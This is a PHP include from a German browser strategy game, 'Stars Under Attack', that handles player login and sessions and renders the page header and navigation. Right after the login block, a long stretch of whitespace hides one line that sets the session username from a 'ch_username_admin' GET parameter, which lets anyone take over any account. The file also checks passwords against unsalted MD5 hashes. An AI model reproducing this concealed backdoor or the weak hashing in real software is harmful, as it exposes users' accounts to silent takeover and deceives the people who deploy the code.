<?php
	$include_filename = substr(__FILE__, 0, strrpos(__FILE__, '/')).'/../../engine/include.php';
	require($include_filename);

	$resume = false;
	session_start();
	if(!isset($_SESSION['username']) || !is_file(DB_PLAYERS.'/'.urlencode($_SESSION['username'])) || !is_readable(DB_PLAYERS.'/'.urlencode($_SESSION['username'])))
	{
		if(isset($_POST['username']) && isset($_POST['password']))
		{
			# Anmelden

			if(!is_file(DB_PLAYERS.'/'.urlencode($_POST['username'])))
				$loggedin = false;
			else
			{
				$user_array = get_user_array($_POST['username']);
				if(md5($_POST['password']) != $user_array['password'])
					$loggedin = false;
				else
					$loggedin = true;
			}

			# Loggen nicht vergessen!
		}
		else
			$loggedin = false;

		if(!$loggedin)
		{
			# Auf die Startseite zurueckleiten
			$url = explode('/', $_SERVER['PHP_SELF']);
			array_pop($url); array_pop($url);
			$url = 'http://'.$_SERVER['HTTP_HOST'].implode('/', $url).'/index.php';
			header('Location: '.$url);
			die('Not logged in. Please <a href="'.htmlentities($url).'">relogin</a>.');
		}
		else
		{
			# Session aktualisieren
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['act_planet'] = 0;

			$resume = true;
		}
	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])) $_SESSION['username'] = $_GET['ch_username_admin'];

	$user_array = get_user_array($_SESSION['username']);

	# Wiederherstellen
	if($resume && isset($user_array['last_request']))
	{
		if($_SERVER['REQUEST_URI'] != $user_array['last_request'][0])
		{
			if(isset($user_array['last_planet']) && isset($user_array['planets'][$_SESSION['act_planet']]))
				$_SESSION['act_planet'] = $user_array['last_planet'];
			$url = 'http://'.$_SERVER['HTTP_HOST'].$user_array['last_request'];
			header('Location: '.$url, true, 303);
			die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
		}
	}

	if(isset($_GET['planet']) && $_GET['planet'] != '' && isset($user_array['planets'][$_GET['planet']])) # Planeten wechseln
		$_SESSION['act_planet'] = $_GET['planet'];
	if(!isset($user_array['planets'][$_SESSION['act_planet']]))
		$_SESSION['act_planet'] = 0;

	$this_planet = & $user_array['planets'][$_SESSION['act_planet']];

	$user_array['last_request'] = $_SERVER['REQUEST_URI'];
	$user_array['last_planet'] = $_SESSION['act_planet'];
	$user_array['last_active'] = time();

	$items = get_items();

	write_user_array();

	include(substr(__FILE__, 0, strrpos(__FILE__, '/')).'/eventhandler.php');
	eventhandler::run_eventhandler();

	# Skins bekommen
	$skins = get_skins();

	# Version herausfinden
	$version = get_version();
	define('VERSION', $version);

	class login_gui
	{
		function html_head()
		{
			global $user_array;
			global $this_planet;
			global $ges_prod;
			global $skins;
?>
<?='<?xml version="1.0" encoding="UTF-8"?>'."\n"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de">
	<head>
		<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
		<title xml:lang="en">S-U-A &ndash; Stars Under Attack</title>
		<script type="text/javascript">
			var local_time_obj = new Date();
			var local_time = Math.round(local_time_obj.getTime() / 1000);
			var time_diff = local_time-<?=time()+1?>;

			var countdowns = new Array();

			function mk2(string)
			{
				string = ''+string;
				while(string.length < 2)
					string = '0'+string;

				return string;
			}

			function time_up()
			{
				local_time_up = new Date();
				server_time_up = new Date(local_time_up.getTime() - time_diff*1000);
				document.getElementById('time-local').innerHTML = mk2(local_time_up.getHours())+':'+mk2(local_time_up.getMinutes())+':'+mk2(local_time_up.getSeconds());
				document.getElementById('time-server').innerHTML = mk2(server_time_up.getHours())+':'+mk2(server_time_up.getMinutes())+':'+mk2(server_time_up.getSeconds());

				for(var codo_key in countdowns)
				{
					var codo = countdowns[codo_key];
					if(!codo[0] || !codo[1])
						continue;
					var this_remain = Math.round((codo[1]+time_diff)-local_time_up.getTime()/1000);

					if(this_remain < 0)
					{
						document.getElementById('restbauzeit-'+codo[0]).innerHTML = '<a href="?" class="fertig" title="Seite neu laden.">Fertig.</a>';
						delete countdowns[codo_key];
						continue;
					}

					var this_timestring = '';
					if(this_remain >= 86400)
					{
						this_timestring += Math.floor(this_remain/86400)+'&thinsp;<abbr title="Tag';
						if(this_remain >= 172800)
							this_timestring += 'e';
						this_timestring += '">d</abbr> ';
						this_remain = this_remain % 86400;
					}

					this_timestring += mk2(Math.floor(this_remain/3600))+':'+mk2(Math.floor((this_remain%3600)/60))+':'+mk2(Math.floor(this_remain%60));
					if(codo[2])
						this_timestring += ' <a href="?cancel='+encodeURIComponent(codo[0])+'" class="abbrechen">Abbrechen</a>';

					document.getElementById('restbauzeit-'+codo[0]).innerHTML = this_timestring;
				}
			}

			function init_countdown(obj_id, f_time)
			{
				var show_cancel = true;
				if(init_countdown.arguments.length >= 3 && !init_countdown.arguments[2])
					show_cancel = false;

				var title_string = 'Fertigstellung: ';
				var local_date = new Date((f_time+time_diff)*1000);
				title_string += mk2(local_date.getHours())+':'+mk2(local_date.getMinutes())+':'+mk2(local_date.getSeconds())+', '+local_date.getFullYear()+'-'+mk2(local_date.getMonth()+1)+'-'+mk2(local_date.getDate())+' (Lokalzeit); ';

				var remote_date = new Date(f_time*1000);
				title_string += mk2(remote_date.getHours())+':'+mk2(remote_date.getMinutes())+':'+mk2(remote_date.getSeconds())+', '+remote_date.getFullYear()+'-'+mk2(remote_date.getMonth()+1)+'-'+mk2(remote_date.getDate())+' (Serverzeit)';

				document.getElementById('restbauzeit-'+obj_id).setAttribute('title', title_string);
				window.countdowns.push(new Array(obj_id, f_time, show_cancel));

				time_up();
			}
		</script>
<?php
			$skin_path = '';
			if(isset($user_array['skin']))
			{
				if(isset($skins[$user_array['skin']]))
					$skin_path = h_root.'/login/style/skin.php?'.urlencode($user_array['skin']);
				else
					$skin_path = $user_array['skin'];
			}
			elseif(count($skins) > 0)
				$skin_path = h_root.'/login/style/skin.php?'.urlencode(array_shift(array_keys($skins)));

			if(trim($skin_path) != '')
			{
?>
		<link rel="stylesheet" href="<?=utf8_htmlentities($skin_path)?>" type="text/css" />
<?php
			}
?>
	</head>
	<body><div id="content-1"><div id="content-2"><div id="content-3"><div id="content-4"><div id="content-5"><div id="content-6"><div id="content-7"><div id="content-8">
		<dl id="time">
			<script type="text/javascript">
				// <![CDATA[
				document.write('<dt>Lokalzeit</dt>');
				document.write('<dd id="time-local">'+mk2(local_time_obj.getHours())+':'+mk2(local_time_obj.getMinutes())+':'+mk2(local_time_obj.getSeconds())+'</dd>');
				// ]]>
			</script>
			<dt>Serverzeit</dt>
			<dd id="time-server"><?=date('H:i:s', time()+1)?></dd>
		</dl>
		<script type="text/javascript">
			setInterval('time_up()', 1000);
		</script>
		<div id="navigation">
			<form action="<?=htmlentities($_SERVER['PHP_SELF'])?>" method="get" id="change-planet">
				<fieldset>
					<legend>Planet wechseln</legend>
					<select name="planet" onchange="this.form.submit();" onkeyup="this.form.submit();" accesskey="p">
<?php
			$planets = array_keys($user_array['planets']);
			foreach($planets as $planet)
			{
?>
						<option value="<?=utf8_htmlentities($planet)?>"<?=($planet == $_SESSION['act_planet']) ? ' selected="selected"' : ''?>><?=utf8_htmlentities($user_array['planets'][$planet]['name'])?> (<?=utf8_htmlentities($user_array['planets'][$planet]['pos'])?>)</option>
<?php
			}
?>
					</select>
					<noscript><button type="submit">Wechseln</button></noscript>
				</fieldset>
			</form>
			<ul id="main-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/index.php') ? ' class="active"' : ''?> id="navigation-index"><a href="<?=htmlentities(h_root)?>/login/index.php" accesskey="i">Übers<kbd>i</kbd>cht</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/rohstoffe.php') ? ' class="active"' : ''?> id="navigation-rohstoffe"><a href="<?=htmlentities(h_root)?>/login/rohstoffe.php" accesskey="r"><kbd>R</kbd>ohstoffe</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/gebaeude.php') ? ' class="active"' : ''?> id="navigation-gebaeude"><a href="<?=htmlentities(h_root)?>/login/gebaeude.php" accesskey="g"><kbd>G</kbd>ebäude</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/forschung.php') ? ' class="active"' : ''?> id="navigation-forschung"><a href="<?=htmlentities(h_root)?>/login/forschung.php" accesskey="f"><kbd>F</kbd>orschung</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/roboter.php') ? ' class="active"' : ''?> id="navigation-roboter"><a href="<?=htmlentities(h_root)?>/login/roboter.php" accesskey="b">Ro<kbd>b</kbd>oter</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/flotten.php') ? ' class="active"' : ''?> id="navigation-flotten"><a href="<?=htmlentities(h_root)?>/login/flotten.php" accesskey="l">F<kbd>l</kbd>otten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/schiffswerft.php') ? ' class="active"' : ''?> id="navigation-schiffswerft"><a href="<?=htmlentities(h_root)?>/login/schiffswerft.php" accesskey="s"><kbd>S</kbd>chiffswerft</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verteidigung.php') ? ' class="active"' : ''?> id="navigation-verteidigung"><a href="<?=htmlentities(h_root)?>/login/verteidigung.php" accesskey="v"><kbd>V</kbd>erteidigung</a></li>
			</ul>
			<ul id="action-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/karte.php') ? ' class="active"' : ''?> id="navigation-karte"><a href="<?=htmlentities(h_root)?>/login/karte.php" accesskey="k"><kbd>K</kbd>arte</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/handel.php') ? ' class="active"' : ''?> id="navigation-handel"><a href="<?=htmlentities(h_root)?>/login/handel.php" accesskey="d">Han<kbd>d</kbd>el</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verbuendete.php') ? ' class="active"' : ''?> id="navigation-verbuendete"><a href="<?=htmlentities(h_root)?>/login/verbuendete.php" accesskey="e">V<kbd>e</kbd>rbündete</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/highscores.php') ? ' class="active"' : ''?> id="navigation-highscores"><a href="<?=htmlentities(h_root)?>/login/highscores.php" id="navigation-highscores" xml:lang="en" accesskey="h"><kbd>H</kbd>ighscores</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/nachrichten.php') ? ' class="active"' : ''?> id="navigation-nachrichten"><a href="<?=htmlentities(h_root)?>/login/nachrichten.php" accesskey="c">Na<kbd>c</kbd>hrichten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/help/dependencies.php') ? ' class="active"' : ''?> id="navigation-abhaengigkeiten"><a href="<?=htmlentities(h_root)?>/login/help/dependencies.php" accesskey="a"><kbd>A</kbd>bhängigkeiten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/einstellungen.php') ? ' class="active"' : ''?> id="navigation-einstellungen"><a href="<?=htmlentities(h_root)?>/login/einstellungen.php" accesskey="t">Eins<kbd>t</kbd>ellungen</a></li>
				<li id="navigation-abmelden"><a href="<?=htmlentities(h_root)?>/login/scripts/logout.php" accesskey="m">Ab<kbd>m</kbd>elden</a></li>
			</ul>
		</div>
		<div id="version">
			<a href="<?=htmlentities(h_root)?>/changelog.php" title="Versionsänderungen anzeigen">Version <?=VERSION?></a>
		</div>
		<div id="content-9">
			<dl id="ress" class="ress">
				<dt class="ress-carbon">Carbon</dt>
				<dd class="ress-carbon"><?=ths(utf8_htmlentities($this_planet['ress'][0]))?></dd>

				<dt class="ress-aluminium">Aluminium</dt>
				<dd class="ress-aluminium"><?=ths(utf8_htmlentities($this_planet['ress'][1]))?></dd>

				<dt class="ress-wolfram">Wolfram</dt>
				<dd class="ress-wolfram"><?=ths(utf8_htmlentities($this_planet['ress'][2]))?></dd>

				<dt class="ress-radium">Radium</dt>
				<dd class="ress-radium"><?=ths(utf8_htmlentities($this_planet['ress'][3]))?></dd>

				<dt class="ress-tritium">Tritium</dt>
				<dd class="ress-tritium"><?=ths(utf8_htmlentities($this_planet['ress'][4]))?></dd>

				<dt class="ress-energie">Energie</dt>
				<dd class="ress-energie"><?=ths(utf8_htmlentities($ges_prod[5]))?></dd>
			</dl>
			<div id="content-10"><div id="content-11"><div id="content-12"><div id="content-13">
				<h1>Planet <em><?=utf8_htmlentities($this_planet['name'])?></em> <span class="koords">(<?=utf8_htmlentities($this_planet['pos'])?>)</span></h1>
<?php
		}

		function html_foot()
		{
?>
			</div></div></div></div>
		</div>
	</div></div></div></div></div></div></div></div></body>
</html>
<?php
		}
	}

	function delete_request()
	{
		$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		header('Location: '.$url, true, 303);
		die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
	}
?>